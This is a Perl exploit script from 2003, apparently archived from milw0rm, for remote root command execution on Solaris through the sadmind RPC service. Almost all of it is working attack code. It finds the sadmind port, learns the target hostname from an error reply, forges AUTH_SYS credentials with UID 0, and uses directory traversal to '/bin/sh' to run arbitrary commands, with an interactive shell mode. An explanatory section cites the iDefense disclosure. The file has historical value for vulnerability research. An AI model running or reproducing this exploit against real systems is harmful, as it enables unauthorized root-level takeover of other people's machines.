#!/usr/bin/perl -w
##################

##
#      Title: rootdown.pl
#      Purpose: Solaris Remote command executiong via sadmind
#      Author: H D Moore hdm at metasploit.com
#      Copyright: Copyright (C) 2003 METASPLOIT.COM
##


use strict;
use POSIX;
use IO::Socket;
use IO::Select;
use Getopt::Std;

my $VERSION = "1.0";
my %opts;

getopts("h:p:c:r:iv", \%opts);

if ($opts{v}) { show_info() }

if (! $opts{h}) { usage() }

my $target_host = $opts{h};

my $target_name = "exploit";

my $command = $opts{c} ? $opts{c} : "touch /tmp/OWNED_BY_SADMIND_\$\$";
my $portmap = $opts{r} ? $opts{r} : 111;


##
# Determine the port used by sadmind  
##

my $target_port = $opts{p} ? $opts{p} : rpc_getport($target_host, $portmap, 100232, 10);

if (! $target_port)
{
    print STDERR "Error: could not determine port used by sadmind\n";
    exit(0);
}

##
#  Determine the hostname of the target
##

my $s = rpc_socket($target_host, $target_port);
my $x = rpc_sadmin_exec($target_name, "id");
print $s $x;
my $r = rpc_read($s);
close ($s);

if ($r && $r =~ m/Security exception on host (.*)\.  USER/)
{
    $target_name = $1;
} else {
    print STDERR "Error: could not obtain target hostname.\n";
    exit(0);
}


##
#  Execute commands :)
##


my $interactive = 0;

if ($opts{i}) { $interactive++ }

do {

    if ($opts{i}) { $command = command_prompt() } else 
    {
        print STDERR "Executing command on '$target_name' via port $target_port\n";
    }
    
    $s = rpc_socket($target_host, $target_port);
    $x = rpc_sadmin_exec($target_name, $command);
    print $s $x;
    $r = rpc_read($s);
    close ($s);

    if ($r) 
    {  
        # Command Failed
        if (length($r) == 36 && substr($r, 24, 4) eq "\x00\x00\x00\x29")
        {
            print STDERR "Error: something went wrong with the RPC format.\n";
            exit(0);
        }

        # Command might have failed
        if (length($r) == 36 && substr($r, 24, 4) eq "\x00\x00\x00\x2b")
        {
            print STDERR "Error: something may have gone wrong with the sadmind format\n";
        }

        # Confirmed success
        if (length($r) == 36 && substr($r, 24, 12) eq ("\x00" x 12))
        {
            print STDERR "Success: your command has been executed successfully.\n";
        }    

        if (length($r) != 36)  { print STDERR "Unknown Response: $r\n" }
        
    } else {
        print STDERR "Error: no response recieved, you may want to try again.\n";
        exit(0);
    }
    
} while ($interactive);

exit(0);

sub usage {
    print STDERR "\n";
    print STDERR "+-----==[ rootdown.pl => Solaris SADMIND Remote Command Execution\n\n";
    print STDERR "       Usage:   $0 -h <target> -c <command> [options]\n";
    print STDERR "     Options:\n";
    print STDERR "                -i\tStart interactive mode (for multiple commands)\n";
    print STDERR "                -p\tAvoid the portmapper and use this sadmind port\n";   
    print STDERR "                -r\tQuery alternate portmapper on this UDP port\n";
    print STDERR "                -v\tDisplay information about this exploit\n";    
    
    print STDERR "\n\n";
    exit(0);
}

sub show_info {

print "\n\n";
print "   Name:  rootdown.pl\n";
print " Author:  H D Moore <hdm\@metasploit.com>\n";
print "Version:  $VERSION\n\n";

# not finsihed :)
print 
"This exploit targets a weakness in the default security settings
of the sadmind RPC application. This application is installed and
enabled by default on most versions of the Solaris operating
system.\n\n".

"The sadmind application defaults to a weak security mode known as
AUTH_SYS (or AUTH_UNIX under Linux/BSD). When running in this mode,
the service will accept a structure containing the user and group
IDs as well as the originating system name. These values are not
validated in any form and are completely controlled by the client.
If the standard sadmin RPC API calls are used to generate the request,
the ADM_CLIENT_HOST parameter is filled in with the hostname of the 
client system. If the RPC packet is modified so that this field is
set to the hostname of the remote system, it will be processed as 
if it was a local request. If the user ID is set to zero or the
value of any user in the sysadmin group, it is possible to call
arbitrary methods in any class available to sadmind.\n\n".

"If the Solstice AdminSuite client software has not been installed,
the only class available is 'system', which only contains a single
method called 'admpipe'. The strings within this program seem to
suggest that it can be used run arbitrary commands, however I chose
a different method of command execution. Since each method is simply 
an executable in the class directory, it is possible to use a 
standard directory traversal attack to execute any application.
We can pass arguments to these methods using the standard API.

An example of spawning a shell which executes the 'id' command:

    # apm -c system -m ../../../../../bin/sh -a arg1=-c arg2=id\n\n".

"To exploit this vulnerability, we must create a RPC packet that
calls the '/bin/sh' method, passing it the parameter of the command
we want to execute. To do this, packet dumps of the 'apm' tool
were obtained and the format was slowly mapped. The hostname of 
the target system must be known for this exploit to work, however
when sadmind is called with the wrong name, it replies with a
'ACCESS DENIED' error message containing the correct name. The 
final code does the following:

1) Queries the portmapper to determine the sadmind port
2) Sends an invalid request to sadmind to obtain the hostname
3) Uses the hostname to forge the RPC packet and execute commands


This vulnerability was reported by Mark Zielinski and disclosed by iDefense.

Related URLs:

 - http://www.idefense.com/advisory/09.16.03.txt
 - http://docs.sun.com/db/doc/816-0211/6m6nc676b?a=view
";





exit(0);
}

sub command_prompt {
    select(STDOUT); $|++;
    
    print STDOUT "\nsadmind> ";
    my $command = <STDIN>;
    chomp($command);
    if (! $command || lc($command) eq "quit" || lc($command) eq "exit")
    {
        print "\nExiting interactive mode...\n";
        exit(0);
    }
    return ($command)
}

sub rpc_socket {
    my ($target_host, $target_port) = @_;
    my $s = IO::Socket::INET->new
    (
        PeerAddr => $target_host, 
        PeerPort => $target_port,
        Proto    => "udp",
        Type     => SOCK_DGRAM
    );

    if (! $s)
    {
        print "\nError: could not create socket to target: $!\n";
        exit(0);
    }

    select($s); $|++;
    select(STDOUT); $|++;
    nonblock($s);
    return($s);
}

sub rpc_read {
    my ($s) = @_;
    my $sel = IO::Select->new($s);
    my $res;
    my @fds = $sel->can_read(4);
    foreach (@fds) { $res .= <$s>; }
    return $res;
}

sub nonblock {
    my ($fd) = @_;
    my $flags = fcntl($fd, F_GETFL,0);
    fcntl($fd, F_SETFL, $flags|O_NONBLOCK);
}

sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;
    
    my $s = rpc_socket($target_host, $target_port);

    my $portmap_req =
        
        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x86\xa0".              # Program Number  (PORTMAP)
        "\x00\x00\x00\x02".              # Program Version (2)
        "\x00\x00\x00\x03".              # Procedure (getport)
        ("\x00" x 16).                   # Credentials and Verifier
        pack("N", $prog) .
        pack("N", $vers).
        pack("N", 0x11).                 # Protocol: UDP
        pack("N", 0x00);                 # Port: 0

    print $s $portmap_req;

    my $r = rpc_read($s);
    close ($s);
    
    if (length($r) == 28) 
    { 
        my $prog_port = unpack("N",substr($r, 24, 4));
        return($prog_port); 
    }
    
    return undef;
}


sub rpc_sadmin_exec {

    my ($hostname, $command) = @_;
    my $packed_host = $hostname . ("\x00" x (59 - length($hostname)));
    
    
    my $rpc =
        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x87\x88".              # Program Number  (SADMIND)
        "\x00\x00\x00\x0a".              # Program Version (10)
        "\x00\x00\x00\x01".              # Procedure
        "\x00\x00\x00\x01";              # Credentials (UNIX)
                                         # Auth Length is filled in

    # pad it up to multiples of 4
    my $rpc_hostname = $hostname;
    while (length($rpc_hostname) % 4 != 0) { $rpc_hostname .= "\x00" }
    
    my $rpc_auth =
        # Time Stamp
        pack("N", time() + 20001) .

        # Machine Name
        pack("N", length($hostname)) . $rpc_hostname .

        "\x00\x00\x00\x00".              # UID = 0
        "\x00\x00\x00\x00".              # GID = 0
        "\x00\x00\x00\x00";              # No Extra Groups  


    $rpc .= pack("N", length($rpc_auth)) . $rpc_auth . ("\x00" x 8);

    my $header =
    
    # Another Time Stamp
    reverse(pack("L", time() + 20005)) .

    "\x00\x07\x45\xdf".
    
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND
    
    "\x00\x00\x00\x0a\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND

    "\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00".

    "\x00\x00\x00\x3b". $packed_host.

    "\x00\x00\x00\x00\x06" . "system".
    
    "\x00\x00\x00\x00\x00\x15". "../../../../../bin/sh". "\x00\x00\x00";
    
    # Append Body Length ^-- Here

    my $body = 
    "\x00\x00\x00\x0e". "ADM_FW_VERSION".
    "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00".
    "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_LANG".
    "\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00".
    "\x00\x01". "C" . 
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x0d". "ADM_REQUESTID".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11".
    "0810:1010101010:1"."\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00".

    "\x00\x00\x00\x09". "ADM_CLASS".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07".
    "\x00\x00\x00\x06" . "system" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0e" . "ADM_CLASS_VERS" .
    "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04".
    "\x00\x00\x00\x03". "2.1".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0a" . "ADM_METHOD" . 
    "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x16".
    "\x00\x00\x00\x15". "../../../../../bin/sh" . 
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_HOST" .
    "\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b".
    $packed_host.

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x0f". "ADM_CLIENT_HOST".
    "\x00\x00\x00\x00\x09".
    
    pack("N", length($hostname) + 1) .
    pack("N", length($hostname)) .
    $rpc_hostname .
    "\x00\x00\x00\x00". "\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_CLIENT_DOMAIN".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_TIMEOUT_PARMS".
    "\x00\x00\x00\x00\x00".
    "\x00\x09\x00\x00\x00\x1c".
    "\x00\x00\x00\x1b" . "TTL=0 PTO=20 PCNT=2 PDLY=30".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x09" . "ADM_FENCE" .
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00".
    "\x00\x00\x03\x00\x00\x00\x02" . "-c" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00".
    "\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00".

    $command . ("\x00" x (512 - length($command))).

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10".
    "netmgt_endofargs";

    my $res = $rpc . $header . pack("N", (length($body) + 4 + length($header)) - 330) . $body;

    return($res);
}



# milw0rm.com [2003-09-19]
